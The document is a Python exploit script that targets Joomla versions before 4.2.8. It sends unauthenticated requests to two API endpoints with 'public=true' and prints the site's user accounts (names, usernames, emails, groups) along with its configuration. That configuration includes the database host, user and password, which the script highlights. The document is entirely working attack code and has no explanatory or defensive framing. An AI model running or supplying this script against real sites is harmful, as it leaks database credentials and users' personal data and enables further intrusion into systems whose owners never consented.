import argparse
import requests
import json
from termcolor import colored  # for colored output

def fetch_users(root_url):
    vuln_url = f"{root_url}/api/index.php/v1/users?public=true"
    response = requests.get(vuln_url)
    return response.json()['data']

def parse_users(data):
    users = []
    for user in data:
        if user['type'] == 'users':
            attributes = user['attributes']
            users.append({
                'id': attributes['id'],
                'name': attributes['name'],
                'username': attributes['username'],
                'email': attributes['email'],
                'groups': attributes['group_names']
            })
    return users

def display_users(root_url):
    data = fetch_users(root_url)
    print(colored('Users', 'red', attrs=['bold']))
    for u in parse_users(data):
        print(f"[{u['id']}] {u['name']} ({colored(u['username'], 'yellow')}) - {u['email']} - {u['groups']}")

def fetch_config(root_url):
    vuln_url = f"{root_url}/api/index.php/v1/config/application?public=true"
    response = requests.get(vuln_url)
    return response.json()['data']

def parse_config(data):
    config = {}
    for entry in data:
        if entry['type'] == 'application':
            key = list(entry['attributes'].keys())[0]
            config[key] = entry['attributes'][key]
    return config

def display_config(root_url):
    c = parse_config(fetch_config(root_url))
    print(colored('Site info', 'red', attrs=['bold']))
    print(f"Site name: {c['sitename']}")
    print(f"Editor: {c['editor']}")
    print(f"Captcha: {c['captcha']}")
    print(f"Access: {c['access']}\n")
    print(colored('Database info', 'red', attrs=['bold']))
    print(f"DB type: {c['dbtype']}")
    print(f"DB host: {c['host']}")
    print(f"DB user: {colored(c['user'], 'yellow', attrs=['bold'])}")
    print(f"DB password: {colored(c['password'], 'yellow', attrs=['bold'])}")
    print(f"DB name: {c['db']}")
    print(f"DB prefix: {c['dbprefix']}")
    print(f"DB encryption: {c['dbencryption']}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Joomla! < 4.2.8 - Unauthenticated information disclosure')

    parser.add_argument('url', help='Root URL (base path) including HTTP scheme, port, and root folder')
    parser.add_argument('--no-color', action='store_true', help='Disable colorized output')

    args = parser.parse_args()

    if args.no_color:
        colored = lambda text, color, attrs=None: text  # Disable color output if specified

    display_users(args.url)
    print()
    display_config(args.url)
